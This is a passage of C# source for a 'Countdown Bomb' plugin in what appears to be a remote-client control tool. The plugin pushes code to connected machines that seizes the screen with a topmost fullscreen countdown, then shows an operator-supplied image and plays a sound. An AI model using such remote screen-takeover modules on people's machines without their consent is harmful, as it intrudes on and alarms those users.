// File: Plugins/Builtin/CountdownBombPlugin.cs
#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class CountdownBombPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, CountdownBombUI> _clientUIs = new();

        public string PluginId => "countdown";
        public string DisplayName => "Countdown Bomb";
        public string Version => "1.1.0";
        public string Description => "Custom countdown with beeps then fullscreen image + sound on remote client.";

        public Task Initialize(PluginHost host)
        {
            _host = host;
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_countdown
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private CancellationTokenSource _cts;

        [DllImport(""user32.dll"", SetLastError = true)]
        static extern IntPtr CreateWindowExW(int exStyle, [MarshalAs(UnmanagedType.LPWStr)] string className, [MarshalAs(UnmanagedType.LPWStr)] string windowName, int style, int x, int y, int w, int h, IntPtr parent, IntPtr menu, IntPtr instance, IntPtr param);
        [DllImport(""user32.dll"")]
        static extern bool ShowWindow(IntPtr hWnd, int cmd);
        [DllImport(""user32.dll"")]
        static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport(""user32.dll"")]
        static extern bool DestroyWindow(IntPtr hWnd);
        [DllImport(""user32.dll"")]
        static extern int GetSystemMetrics(int index);
        [DllImport(""user32.dll"")]
        static extern bool SetWindowPos(IntPtr hWnd, IntPtr insertAfter, int x, int y, int cx, int cy, int flags);
        [DllImport(""user32.dll"")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr rect, bool erase);
        [DllImport(""user32.dll"")]
        static extern bool GetMessageW(out MSG msg, IntPtr hWnd, int min, int max);
        [DllImport(""user32.dll"")]
        static extern bool TranslateMessage(ref MSG msg);
        [DllImport(""user32.dll"")]
        static extern IntPtr DispatchMessageW(ref MSG msg);
        [DllImport(""user32.dll"")]
        static extern bool PostMessageW(IntPtr hWnd, int msg, IntPtr wp, IntPtr lp);
        [DllImport(""user32.dll"")]
        static extern IntPtr DefWindowProcW(IntPtr hWnd, int msg, IntPtr wp, IntPtr lp);
        [DllImport(""user32.dll"", SetLastError = true)]
        static extern ushort RegisterClassExW(ref WNDCLASSEXW wc);
        [DllImport(""user32.dll"")]
        static extern IntPtr LoadCursorW(IntPtr instance, int cursor);
        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetModuleHandleW(string name);
        [DllImport(""user32.dll"")]
        static extern bool GetWindowRect(IntPtr hWnd, out RECT rect);
        [DllImport(""user32.dll"")]
        static extern IntPtr SetTimer(IntPtr hWnd, IntPtr timerId, int ms, IntPtr proc);
        [DllImport(""user32.dll"")]
        static extern bool KillTimer(IntPtr hWnd, IntPtr timerId);
        [DllImport(""user32.dll"")]
        static extern void PostQuitMessage(int exitCode);
        [DllImport(""kernel32.dll"")]
        static extern int GetLastError();

        [DllImport(""gdi32.dll"")]
        static extern IntPtr CreateSolidBrush(int color);
        [DllImport(""gdi32.dll"")]
        static extern IntPtr CreateFontW(int h, int w, int esc, int ori, int weight, int italic, int underline, int strike, int charset, int outprec, int clipprec, int quality, int pitch, [MarshalAs(UnmanagedType.LPWStr)] string face);
        [DllImport(""gdi32.dll"")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr obj);
        [DllImport(""gdi32.dll"")]
        static extern int SetTextColor(IntPtr hdc, int color);
        [DllImport(""gdi32.dll"")]
        static extern int SetBkMode(IntPtr hdc, int mode);
        [DllImport(""gdi32.dll"")]
        static extern bool DeleteObject(IntPtr obj);
        [DllImport(""user32.dll"")]
        static extern int FillRect(IntPtr hdc, ref RECT rect, IntPtr brush);
        [DllImport(""user32.dll"", CharSet = CharSet.Unicode)]
        static extern int DrawTextW(IntPtr hdc, string text, int count, ref RECT rect, int format);
        [DllImport(""user32.dll"")]
        static extern bool BeginPaint(IntPtr hWnd, out PAINTSTRUCT ps);
        [DllImport(""user32.dll"")]
        static extern bool EndPaint(IntPtr hWnd, ref PAINTSTRUCT ps);

        [DllImport(""gdiplus.dll"")]
        static extern int GdiplusStartup(out IntPtr token, ref GdiplusStartupInput input, IntPtr output);
        [DllImport(""gdiplus.dll"")]
        static extern void GdiplusShutdown(IntPtr token);
        [DllImport(""gdiplus.dll"", CharSet = CharSet.Unicode)]
        static extern int GdipCreateBitmapFromFile(string file, out IntPtr bitmap);
        [DllImport(""gdiplus.dll"")]
        static extern int GdipGetImageWidth(IntPtr image, out int width);
        [DllImport(""gdiplus.dll"")]
        static extern int GdipGetImageHeight(IntPtr image, out int height);
        [DllImport(""gdiplus.dll"")]
        static extern int GdipCreateFromHDC(IntPtr hdc, out IntPtr graphics);
        [DllImport(""gdiplus.dll"")]
        static extern int GdipDrawImageRectI(IntPtr graphics, IntPtr image, int x, int y, int w, int h);
        [DllImport(""gdiplus.dll"")]
        static extern int GdipDeleteGraphics(IntPtr graphics);
        [DllImport(""gdiplus.dll"")]
        static extern int GdipDisposeImage(IntPtr image);
        [DllImport(""gdiplus.dll"")]
        static extern int GdipSetInterpolationMode(IntPtr graphics, int mode);

        [DllImport(""winmm.dll"")]
        static extern bool PlaySound(byte[] data, IntPtr module, int flags);
        [DllImport(""winmm.dll"", CharSet = CharSet.Auto)]
        static extern bool PlaySound(string name, IntPtr module, int flags);
        [DllImport(""winmm.dll"", CharSet = CharSet.Unicode)]
        static extern int mciSendStringW(string command, StringBuilder buffer, int bufferSize, IntPtr callback);
        [DllImport(""kernel32.dll"")]
        static extern void Beep(int freq, int duration);

        const int SND_ASYNC = 0x0001;
        const int SND_MEMORY = 0x0004;
        const int SND_NODEFAULT = 0x0002;
        const int SND_PURGE = 0x0040;

        [StructLayout(LayoutKind.Sequential)]
        struct GdiplusStartupInput
        {
            public int GdiplusVersion;
            public IntPtr DebugEventCallback;
            public int SuppressBackgroundThread;
            public int SuppressExternalCodecs;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct MSG
        {
            public IntPtr hwnd;
            public int message;
            public IntPtr wParam;
            public IntPtr lParam;
            public int time;
            public int ptX;
            public int ptY;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct RECT
        {
            public int left, top, right, bottom;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PAINTSTRUCT
        {
            public IntPtr hdc;
            public bool fErase;
            public RECT rcPaint;
            public bool fRestore;
            public bool fIncUpdate;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
            public byte[] rgbReserved;
        }

        delegate IntPtr WndProcDelegate(IntPtr hWnd, int msg, IntPtr wp, IntPtr lp);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct WNDCLASSEXW
        {
            public int cbSize;
            public int style;
            [MarshalAs(UnmanagedType.FunctionPtr)]
            public WndProcDelegate lpfnWndProc;
            public int cbClsExtra;
            public int cbWndExtra;
            public IntPtr hInstance;
            public IntPtr hIcon;
            public IntPtr hCursor;
            public IntPtr hbrBackground;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string lpszMenuName;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string lpszClassName;
            public IntPtr hIconSm;
        }

        const int WS_POPUP = unchecked((int)0x80000000);
        const int WS_VISIBLE = 0x10000000;
        const int WS_EX_TOPMOST = 0x00000008;
        const int WS_EX_TOOLWINDOW = 0x00000080;
        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        const int SWP_SHOWWINDOW = 0x0040;
        const int SW_SHOW = 5;
        const int WM_PAINT = 0x000F;
        const int WM_DESTROY = 0x0002;
        const int WM_KEYDOWN = 0x0100;
        const int WM_LBUTTONDOWN = 0x0201;
        const int WM_USER = 0x0400;
        const int WM_USER_CLOSE = WM_USER + 1;
        const int WM_TIMER = 0x0113;
        const int DT_CENTER = 0x01;
        const int DT_VCENTER = 0x04;
        const int DT_SINGLELINE = 0x20;
        const int TRANSPARENT = 1;
        const int IDC_ARROW = 32512;

        volatile int _countdownState;
        int _countdownFrom = 3;
        IntPtr _hwnd;
        IntPtr _gdipToken;
        IntPtr _gdipImage;
        byte[] _imageData;
        byte[] _soundData;
        bool _soundIsMp3;
        int _displaySeconds = 10;
        int _ticksRemaining;
        WndProcDelegate _wndProcDel;
        volatile bool _windowRunning;
        string _tempImagePath;
        string _tempSoundPath;
        bool _mciPlaying;

        MemoryStream _chunkStream;
        int _chunkExpectedLen;
        byte _chunkType;
        IntPtr _bgBrush;

        void LogSync(string msg)
        {
            try
            {
                byte[] b = Encoding.UTF8.GetBytes(msg);
                byte[] m = new byte[b.Length + 1];
                m[0] = 0xFD;
                Buffer.BlockCopy(b, 0, m, 1, b.Length);
                _send(m).Wait(2000);
            }
            catch { }
        }

        async Task LogA(string msg)
        {
            try
            {
                byte[] b = Encoding.UTF8.GetBytes(msg);
                byte[] m = new byte[b.Length + 1];
                m[0] = 0xFD;
                Buffer.BlockCopy(b, 0, m, 1, b.Length);
                await _send(m);
            }
            catch { }
        }

        async Task SendAck(byte cmd, string msg)
        {
            try
            {
                byte[] mb = Encoding.UTF8.GetBytes(msg);
                byte[] packet = new byte[mb.Length + 2];
                packet[0] = 0xFE;
                packet[1] = cmd;
                Buffer.BlockCopy(mb, 0, packet, 2, mb.Length);
                await _send(packet);
            }
            catch { }
        }

        async Task SendErr(string msg)
        {
            try
            {
                byte[] mb = Encoding.UTF8.GetBytes(msg);
                byte[] packet = new byte[mb.Length + 2];
                packet[0] = 0xFF;
                packet[1] = 0x00;
                Buffer.BlockCopy(mb, 0, packet, 2, mb.Length);
                await _send(packet);
            }
            catch { }
        }

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;
            _cts = new CancellationTokenSource();
            _wndProcDel = new WndProcDelegate(WndProc);

            await LogA(""[INIT] Countdown Bomb plugin ready"");
            await SendAck(0x01, ""Ready"");

            while (!_cts.IsCancellationRequested)
            {
                byte[] data = null;
                bool fail = false;
                try { data = await receiveData(); }
                catch { fail = true; }
                if (fail || data == null || data.Length == 0) break;

                string errMsg = null;
                try { await HandleCmd(data); }
                catch (Exception ex) { errMsg = ex.GetType().Name + "": "" + ex.Message; }
                if (errMsg != null) await LogA(""[ERR] "" + errMsg);
            }

            DismissWindow();
            CleanupGdi();
            _cts.Cancel();
        }

        async Task HandleCmd(byte[] data)
        {
            byte cmd = data[0];

            switch (cmd)
            {
                case 0x10:
                    if (data.Length > 1)
                    {
                        _imageData = new byte[data.Length - 1];
                        Buffer.BlockCopy(data, 1, _imageData, 0, _imageData.Length);
                        await LogA(""[OK] Image received: "" + _imageData.Length + "" bytes"");
                        await SendAck(0x10, ""Image loaded ("" + _imageData.Length + "" bytes)"");
                    }
                    break;

                case 0x11:
                    if (data.Length > 2)
                    {
                        _soundIsMp3 = (data[1] == 1);
                        _soundData = new byte[data.Length - 2];
                        Buffer.BlockCopy(data, 2, _soundData, 0, _soundData.Length);
                        await LogA(""[OK] Sound received: "" + _soundData.Length + "" bytes, mp3="" + _soundIsMp3);
                        await SendAck(0x11, ""Sound loaded ("" + _soundData.Length + "" bytes, "" + (_soundIsMp3 ? ""mp3"" : ""wav"") + "")"");
                    }
                    break;

                case 0x20:
                case 0x21:
                    if (data.Length > 5)
                    {
                        _chunkExpectedLen = data[1] | (data[2] << 8) | (data[3] << 16) | (data[4] << 24);
                        _chunkType = (byte)(cmd == 0x20 ? 0x10 : 0x11);
                        if (cmd == 0x21 && data.Length > 5)
                        {
                            _soundIsMp3 = (data[5] == 1);
                            if (_chunkStream != null) _chunkStream.Dispose();
                            _chunkStream = new MemoryStream(_chunkExpectedLen);
                            if (data.Length > 6)
                                _chunkStream.Write(data, 6, data.Length - 6);
                        }
                        else
                        {
                            if (_chunkStream != null) _chunkStream.Dispose();
                            _chunkStream = new MemoryStream(_chunkExpectedLen);
                            _chunkStream.Write(data, 5, data.Length - 5);
                        }
                        await LogA(""[CHUNK] Start "" + (cmd == 0x20 ? ""image"" : ""sound"") + "" total="" + _chunkExpectedLen + "" got="" + _chunkStream.Length);
                        if (_chunkStream.Length >= _chunkExpectedLen)
                            await FinalizeChunk();
                    }
                    break;

                case 0x22:
                    if (_chunkStream != null && data.Length > 1)
                    {
                        _chunkStream.Write(data, 1, data.Length - 1);
                        if (_chunkStream.Length >= _chunkExpectedLen)
                            await FinalizeChunk();
                    }
                    break;

                case 0x12:
                    {
                        int secs = 10;
                        if (data.Length > 1) secs = data[1];
                        if (secs < 1) secs = 1;
                        if (secs > 60) secs = 60;
                        _displaySeconds = secs;

                        int cdFrom = 3;
                        if (data.Length > 2) cdFrom = data[2];
                        if (cdFrom < 1) cdFrom = 1;
                        if (cdFrom > 99) cdFrom = 99;
                        _countdownFrom = cdFrom;

                        if (_imageData == null || _imageData.Length == 0)
                        {
                            await SendErr(""No image loaded - upload an image first"");
                            return;
                        }

                        if (_windowRunning)
                        {
                            DismissWindow();
                            Thread.Sleep(500);
                        }

                        await LogA(""[GO] Countdown starting from "" + cdFrom + "", display="" + secs + ""s"");
                        await SendAck(0x12, ""Countdown started (from="" + cdFrom + "", display="" + secs + ""s)"");

                        var thr = new Thread(() => RunCountdownWindow());
                        thr.SetApartmentState(ApartmentState.STA);
                        thr.IsBackground = true;
                        thr.Start();
                    }
                    break;

                case 0x13:
                    DismissWindow();
                    await SendAck(0x13, ""Dismissed"");
                    break;

                case 0x14:
                    _imageData = null;
                    _soundData = null;
                    _soundIsMp3 = false;
                    await SendAck(0x14, ""Assets cleared"");
                    break;
            }
        }

        async Task FinalizeChunk()
        {
            byte[] assembled = _chunkStream.ToArray();
            _chunkStream.Dispose();
            _chunkStream = null;

            if (_chunkType == 0x10)
            {
                _imageData = assembled;
                await LogA(""[OK] Image assembled: "" + _imageData.Length + "" bytes"");
                await SendAck(0x10, ""Image loaded ("" + _imageData.Length + "" bytes)"");
            }
            else
            {
                _soundData = assembled;
                await LogA(""[OK] Sound assembled: "" + _soundData.Length + "" bytes, mp3="" + _soundIsMp3);
                await SendAck(0x11, ""Sound loaded ("" + _soundData.Length + "" bytes, "" + (_soundIsMp3 ? ""mp3"" : ""wav"") + "")"");
            }
        }

        void RunCountdownWindow()
        {
            try
            {
                var gdiInput = new GdiplusStartupInput { GdiplusVersion = 1 };
                GdiplusStartup(out _gdipToken, ref gdiInput, IntPtr.Zero);

                _tempImagePath = Path.Combine(Path.GetTempPath(), ""_cdb_"" + Guid.NewGuid().ToString(""N"") + "".tmp"");
                File.WriteAllBytes(_tempImagePath, _imageData);
                int gdipResult = GdipCreateBitmapFromFile(_tempImagePath, out _gdipImage);
                if (gdipResult != 0)
                {
                    _gdipImage = IntPtr.Zero;
                    LogSync(""[ERR] GDI+ load failed code="" + gdipResult);
                }
                else
                {
                    int iw, ih;
                    GdipGetImageWidth(_gdipImage, out iw);
                    GdipGetImageHeight(_gdipImage, out ih);
                    LogSync(""[IMG] Loaded "" + iw + ""x"" + ih);
                }

                if (_soundData != null && _soundData.Length > 0 && _soundIsMp3)
                {
                    _tempSoundPath = Path.Combine(Path.GetTempPath(), ""_cdb_"" + Guid.NewGuid().ToString(""N"") + "".mp3"");
                    File.WriteAllBytes(_tempSoundPath, _soundData);
                    LogSync(""[SND] MP3 saved to temp: "" + _tempSoundPath);
                }

                IntPtr hInstance = GetModuleHandleW(null);
                string className = ""CDBWnd"" + Thread.CurrentThread.ManagedThreadId;

                _bgBrush = CreateSolidBrush(0x000000);

                var wc = new WNDCLASSEXW();
                wc.cbSize = Marshal.SizeOf(typeof(WNDCLASSEXW));
                wc.style = 0x0003;
                wc.lpfnWndProc = _wndProcDel;
                wc.cbClsExtra = 0;
                wc.cbWndExtra = 0;
                wc.hInstance = hInstance;
                wc.hIcon = IntPtr.Zero;
                wc.hCursor = LoadCursorW(IntPtr.Zero, IDC_ARROW);
                wc.hbrBackground = _bgBrush;
                wc.lpszMenuName = null;
                wc.lpszClassName = className;
                wc.hIconSm = IntPtr.Zero;

                ushort atom = RegisterClassExW(ref wc);
                if (atom == 0)
                {
                    int regErr = GetLastError();
                    if (regErr != 1410)
                    {
                        LogSync(""[ERR] RegisterClassEx failed err="" + regErr);
                        CleanupGdi();
                        return;
                    }
                }

                int screenW = GetSystemMetrics(0);
                int screenH = GetSystemMetrics(1);
                LogSync(""[WIN] Screen="" + screenW + ""x"" + screenH + "" class="" + className + "" atom="" + atom);

                _hwnd = CreateWindowExW(
                    WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
                    className,
                    """",
                    WS_POPUP | WS_VISIBLE,
                    0, 0, screenW, screenH,
                    IntPtr.Zero, IntPtr.Zero, hInstance, IntPtr.Zero);

                if (_hwnd == IntPtr.Zero)
                {
                    int createErr = GetLastError();
                    LogSync(""[ERR] CreateWindowEx failed err="" + createErr);
                    CleanupGdi();
                    return;
                }

                SetWindowPos(_hwnd, HWND_TOPMOST, 0, 0, screenW, screenH, SWP_SHOWWINDOW);
                ShowWindow(_hwnd, SW_SHOW);
                SetForegroundWindow(_hwnd);

                _countdownState = _countdownFrom;
                _windowRunning = true;

                SetTimer(_hwnd, (IntPtr)1, 1000, IntPtr.Zero);
                ThreadPool.QueueUserWorkItem(_ => { try { Beep(800, 200); } catch { } });

                LogSync(""[WIN] Created hwnd=0x"" + _hwnd.ToString(""X"") + "" countdown="" + _countdownFrom);

                MSG msg;
                while (GetMessageW(out msg, IntPtr.Zero, 0, 0))
                {
                    TranslateMessage(ref msg);
                    DispatchMessageW(ref msg);
                }

                _windowRunning = false;
                _hwnd = IntPtr.Zero;
                CleanupGdi();
                LogSync(""[WIN] Closed"");
            }
            catch (Exception ex)
            {
                _windowRunning = false;
                _hwnd = IntPtr.Zero;
                LogSync(""[ERR] Window thread: "" + ex.GetType().Name + "": "" + ex.Message);
                CleanupGdi();
            }
        }

        IntPtr WndProc(IntPtr hWnd, int msg, IntPtr wp, IntPtr lp)
        {
            switch (msg)
            {
                case WM_PAINT:
                    PAINTSTRUCT ps;
                    BeginPaint(hWnd, out ps);
                    DoPaint(ps.hdc, hWnd);
                    EndPaint(hWnd, ref ps);
                    return IntPtr.Zero;

                case WM_TIMER:
                    DoTimer(hWnd);
                    return IntPtr.Zero;

                case WM_KEYDOWN:
                case WM_LBUTTONDOWN:
                    if (_countdownState == 99)
                    {
                        KillTimer(hWnd, (IntPtr)1);
                        KillTimer(hWnd, (IntPtr)2);
                        StopSound();
                        DestroyWindow(hWnd);
                    }
                    return IntPtr.Zero;

                case WM_USER_CLOSE:
                    KillTimer(hWnd, (IntPtr)1);
                    KillTimer(hWnd, (IntPtr)2);
                    StopSound();
                    DestroyWindow(hWnd);
                    return IntPtr.Zero;

                case WM_DESTROY:
                    PostQuitMessage(0);
                    return IntPtr.Zero;
            }
            return DefWindowProcW(hWnd, msg, wp, lp);
        }

        void DoTimer(IntPtr hWnd)
        {
            if (_countdownState > 1)
            {
                _countdownState--;
                InvalidateRect(hWnd, IntPtr.Zero, true);
                int freq = 600 + ((_countdownFrom - _countdownState) * 200 / Math.Max(_countdownFrom - 1, 1));
                if (freq > 1200) freq = 1200;
                ThreadPool.QueueUserWorkItem(_ => { try { Beep(freq, 200); } catch { } });
            }
            else if (_countdownState == 1)
            {
                KillTimer(hWnd, (IntPtr)1);
                _countdownState = 99;
                InvalidateRect(hWnd, IntPtr.Zero, true);

                if (_soundData != null && _soundData.Length > 0)
                {
                    bool played = false;
                    if (_soundIsMp3 && _tempSoundPath != null)
                    {
                        try
                        {
                            mciSendStringW(""close cdbmp3"", null, 0, IntPtr.Zero);
                            string openCmd = ""open \"""" + _tempSoundPath + ""\"" type mpegvideo alias cdbmp3"";
                            int r1 = mciSendStringW(openCmd, null, 0, IntPtr.Zero);
                            if (r1 == 0)
                            {
                                mciSendStringW(""play cdbmp3 from 0"", null, 0, IntPtr.Zero);
                                _mciPlaying = true;
                                played = true;
                            }
                        }
                        catch { }
                    }
                    else
                    {
                        byte[] sd = _soundData;
                        try { played = PlaySound(sd, IntPtr.Zero, SND_ASYNC | SND_MEMORY | SND_NODEFAULT); }
                        catch { }
                    }
                    if (!played)
                        ThreadPool.QueueUserWorkItem(_ => { try { Beep(1200, 500); } catch { } });
                }
                else
                {
                    ThreadPool.QueueUserWorkItem(_ => { try { Beep(1200, 500); } catch { } });
                }

                _ticksRemaining = _displaySeconds;
                SetTimer(hWnd, (IntPtr)2, 1000, IntPtr.Zero);
            }
            else if (_countdownState == 99)
            {
                _ticksRemaining--;
                if (_ticksRemaining <= 0)
                {
                    KillTimer(hWnd, (IntPtr)2);
                    StopSound();
                    DestroyWindow(hWnd);
                }
            }
        }

        void DoPaint(IntPtr hdc, IntPtr hWnd)
        {
            RECT rc;
            GetWindowRect(hWnd, out rc);
            int w = rc.right - rc.left;
            int h = rc.bottom - rc.top;
            RECT client = new RECT { left = 0, top = 0, right = w, bottom = h };

            IntPtr blackBrush = CreateSolidBrush(0x000000);
            FillRect(hdc, ref client, blackBrush);
            DeleteObject(blackBrush);

            if (_countdownState >= 1 && _countdownState <= _countdownFrom)
            {
                int fontSize = Math.Min(w, h) * 2 / 3;
                IntPtr font = CreateFontW(fontSize, 0, 0, 0, 900, 0, 0, 0, 0, 0, 0, 4, 0, ""Impact"");
                IntPtr oldFont = SelectObject(hdc, font);

                double ratio = (double)_countdownState / _countdownFrom;
                int r, g, b2;
                if (ratio > 0.5)
                {
                    r = 64 + (int)(191 * (1.0 - ratio) * 2);
                    g = 207;
                    b2 = 255;
                }
                else
                {
                    r = 255;
                    g = (int)(207 * ratio * 2);
                    b2 = 32 + (int)(32 * ratio * 2);
                }
                int color = b2 | (g << 8) | (r << 16);

                SetTextColor(hdc, color);
                SetBkMode(hdc, TRANSPARENT);

                string text = _countdownState.ToString();
                DrawTextW(hdc, text, text.Length, ref client, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

                SelectObject(hdc, oldFont);
                DeleteObject(font);

                int barH = 20;
                int barMargin = 40;
                int barY = h - barH - barMargin;
                int barMaxW = w - barMargin * 2;
                int barW = (int)(barMaxW * ratio);

                RECT barBg = new RECT { left = barMargin, top = barY, right = barMargin + barMaxW, bottom = barY + barH };
                IntPtr darkBrush = CreateSolidBrush(0x333333);
                FillRect(hdc, ref barBg, darkBrush);
                DeleteObject(darkBrush);

                if (barW > 0)
                {
                    RECT barFg = new RECT { left = barMargin, top = barY, right = barMargin + barW, bottom = barY + barH };
                    int barColor = b2 | (g << 8) | (r << 16);
                    IntPtr barBrush = CreateSolidBrush(barColor);
                    FillRect(hdc, ref barFg, barBrush);
                    DeleteObject(barBrush);
                }

                int labelFontSize = 16;
                IntPtr labelFont = CreateFontW(labelFontSize, 0, 0, 0, 700, 0, 0, 0, 0, 0, 0, 4, 0, ""Arial"");
                IntPtr oldLabelFont = SelectObject(hdc, labelFont);
                SetTextColor(hdc, 0xCCCCCC);
                SetBkMode(hdc, TRANSPARENT);
                RECT labelRect = new RECT { left = barMargin, top = barY - labelFontSize - 6, right = barMargin + barMaxW, bottom = barY - 2 };
                string labelText = _countdownState.ToString() + "" / "" + _countdownFrom.ToString();
                DrawTextW(hdc, labelText, labelText.Length, ref labelRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
                SelectObject(hdc, oldLabelFont);
                DeleteObject(labelFont);
            }
            else if (_countdownState == 99)
            {
                if (_gdipImage != IntPtr.Zero)
                {
                    IntPtr graphics;
                    if (GdipCreateFromHDC(hdc, out graphics) == 0)
                    {
                        GdipSetInterpolationMode(graphics, 7);
                        int imgW, imgH;
                        GdipGetImageWidth(_gdipImage, out imgW);
                        GdipGetImageHeight(_gdipImage, out imgH);

                        if (imgW > 0 && imgH > 0)
                        {
                            double scaleX = (double)w / imgW;
                            double scaleY = (double)h / imgH;
                            double scale = Math.Max(scaleX, scaleY);
                            int drawW = (int)(imgW * scale);
                            int drawH = (int)(imgH * scale);
                            int drawX = (w - drawW) / 2;
                            int drawY = (h - drawH) / 2;
                            GdipDrawImageRectI(graphics, _gdipImage, drawX, drawY, drawW, drawH);
                        }
                        GdipDeleteGraphics(graphics);
                    }
                }
                else
                {
                    int fontSize2 = Math.Min(w, h) / 8;
                    IntPtr font2 = CreateFontW(fontSize2, 0, 0, 0, 700, 0, 0, 0, 0, 0, 0, 4, 0, ""Arial"");
                    IntPtr oldFont2 = SelectObject(hdc, font2);
                    SetTextColor(hdc, 0x000000FF);
                    SetBkMode(hdc, TRANSPARENT);
                    string errText = ""IMAGE LOAD FAILED"";
                    DrawTextW(hdc, errText, errText.Length, ref client, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
                    SelectObject(hdc, oldFont2);
                    DeleteObject(font2);
                }
            }
        }

        void StopSound()
        {
            try { PlaySound((string)null, IntPtr.Zero, SND_PURGE); } catch { }
            if (_mciPlaying)
            {
                try { mciSendStringW(""stop cdbmp3"", null, 0, IntPtr.Zero); } catch { }
                try { mciSendStringW(""close cdbmp3"", null, 0, IntPtr.Zero); } catch { }
                _mciPlaying = false;
            }
        }

        void DismissWindow()
        {
            try
            {
                if (_hwnd != IntPtr.Zero && _windowRunning)
                    PostMessageW(_hwnd, WM_USER_CLOSE, IntPtr.Zero, IntPtr.Zero);
            }
            catch { }
        }

        void CleanupGdi()
        {
            try
            {
                StopSound();
                if (_gdipImage != IntPtr.Zero) { GdipDisposeImage(_gdipImage); _gdipImage = IntPtr.Zero; }
                if (_gdipToken != IntPtr.Zero) { GdiplusShutdown(_gdipToken); _gdipToken = IntPtr.Zero; }
                if (_tempImagePath != null)
                {
                    try { File.Delete(_tempImagePath); } catch { }
                    _tempImagePath = null;
                }
                if (_tempSoundPath != null)
                {
                    try { File.Delete(_tempSoundPath); } catch { }
                    _tempSoundPath = null;
                }
                if (_bgBrush != IntPtr.Zero) { DeleteObject(_bgBrush); _bgBrush = IntPtr.Zero; }
            }
            catch { }
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            bool isActive = _host.IsPluginActive(context.ClientId, PluginId);
            if (!isActive)
            {
                _ = Task.Run(async () =>
                {
                    try { await _host.StartPluginForClient(context.ClientId, PluginId); }
                    catch { }
                });
            }
            var ui = new CountdownBombUI(context, _host, this);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;
            if (_clientUIs.TryGetValue(clientId, out var ui))
                ui.HandleServerData(data);
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui)) ui.Dispose();
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
        }
    }

    [SupportedOSPlatform("windows")]
    public class CountdownBombUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private readonly PluginContext _context;
        private readonly PluginHost _host;
        private readonly CountdownBombPlugin _plugin;

        Color BgCol => C("BackgroundColor");
        Color SurfCol => C("SurfaceColor");
        Color SurfLCol => C("SurfaceLightColor");
        Color BrdCol => C("BorderColor");
        Color TxtCol => C("TextPrimaryColor");
        Color DimCol => C("TextSecondaryColor");
        Color DanCol => C("DangerColor");
        Color DanHov => C("DangerHoverColor");
        Color OkCol => C("SuccessColor");
        Color OkHov => C("SuccessHoverColor");
        Color WarnCol => C("WarningColor");
        Color WarnHov => C("WarningColor");
        Color DisCol => C("ButtonBgColor");
        Color AccCol => C("PrimaryColor");
        Color AccHov => C("PrimaryHoverColor");
        Color ButtonBorderClr => C("ButtonBorderColor");
        Color ButtonBgClr => C("ButtonBgColor");
        Color ButtonBgHoverClr => C("ButtonBgHoverColor");

        SolidColorBrush BgB => B("BackgroundBrush");
        SolidColorBrush SfB => B("SurfaceBrush");
        SolidColorBrush SlB => B("SurfaceLightBrush");
        SolidColorBrush TxB => B("TextPrimaryBrush");
        SolidColorBrush DmB => B("TextSecondaryBrush");
        SolidColorBrush BdB => B("BorderBrush");
        SolidColorBrush DsB => B("ButtonBgBrush");

        private readonly TextBlock _imgLabel;
        private readonly TextBlock _sndLabel;
        private readonly TextBlock _imgSizeLabel;
        private readonly TextBlock _sndSizeLabel;
        private readonly TextBlock _status;
        private readonly TextBox _logBox;
        private readonly Slider _durSlider;
        private readonly TextBlock _durLabel;
        private readonly Slider _cdSlider;
        private readonly TextBlock _cdLabel;
        private readonly Button _fireBtn;
        private readonly Button _dismissBtn;
        private readonly Button _imgUpBtn;
        private readonly Button _sndUpBtn;
        private readonly Border _imgPreview;
        private readonly Border _logBrd;
        private readonly ProgressBar _uploadProgress;
        private readonly TextBlock _uploadProgressLabel;
        private Border _imgDot;
        private Border _sndDot;

        private byte[] _imageBytes;
        private byte[] _soundBytes;
        private bool _soundIsMp3;
        private string _imageName = "(none)";
        private string _soundName = "(none)";
        private bool _imageUploaded;
        private bool _soundUploaded;
        private bool _disposed;
        private int _logLines;
        private volatile bool _uploading;

        private const int CHUNK_SIZE = 32768;

        public CountdownBombUI(PluginContext ctx, PluginHost host, CountdownBombPlugin plugin)
        {
            _context = ctx;
            _host = host;
            _plugin = plugin;

            var root = new Grid();
